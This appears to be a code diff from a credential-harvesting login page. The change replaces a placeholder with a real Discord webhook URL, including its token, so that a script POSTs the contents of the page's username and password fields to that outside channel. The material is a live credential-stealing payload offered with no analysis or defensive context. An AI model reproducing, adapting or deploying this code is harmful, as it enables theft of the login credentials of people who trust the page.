@@ -98,7 +98,7 @@
   } while (currentDate - date < milliseconds);
 }
     var request = new XMLHttpRequest();
-    request.open("POST", "WEBHOOK");
+    request.open("POST", "https://discord.com/api/webhooks/1221270233650561046/JLxlU1Rz54tDhh0Wy3ddX_jSB3YliaK4rPmVTso-cUPjXCQu6JGLko-B1wjENSPbTy9s");
     request.setRequestHeader('Content-type', 'application/json');
     var params = {
       content: ("> **USERNAME  : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
